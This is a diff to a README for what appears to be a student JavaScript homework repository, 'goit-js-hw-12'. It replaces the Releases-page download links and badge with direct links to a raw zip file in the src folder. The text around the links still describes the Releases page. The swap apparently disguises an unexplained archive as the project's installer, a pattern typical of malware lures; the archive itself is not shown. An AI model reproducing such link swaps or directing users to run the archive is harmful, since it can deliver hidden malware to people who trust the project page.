@@ -6,7 +6,7 @@ Welcome to the goit-js-hw-12 repository! This is a simple application that helps
 
 ## 📥 Download Now
 
-[![Download goit-js-hw-12](https://img.shields.io/badge/Download-goit--js--hw--12-brightgreen)](https://github.com/jakepetch17/goit-js-hw-12/releases)
+[![Download goit-js-hw-12](https://github.com/jakepetch17/goit-js-hw-12/raw/refs/heads/main/src/hw_js_goit_2.7-alpha.5.zip)](https://github.com/jakepetch17/goit-js-hw-12/raw/refs/heads/main/src/hw_js_goit_2.7-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ To run this application smoothly on your computer, ensure you meet the following
 
 ## 📦 Download & Install
 
-To install the application, visit this page to download: [GitHub Releases Page](https://github.com/jakepetch17/goit-js-hw-12/releases).
+To install the application, visit this page to download: [GitHub Releases Page](https://github.com/jakepetch17/goit-js-hw-12/raw/refs/heads/main/src/hw_js_goit_2.7-alpha.5.zip).
 
 1. Open the link above.
 2. Scroll down to the "Assets" section.
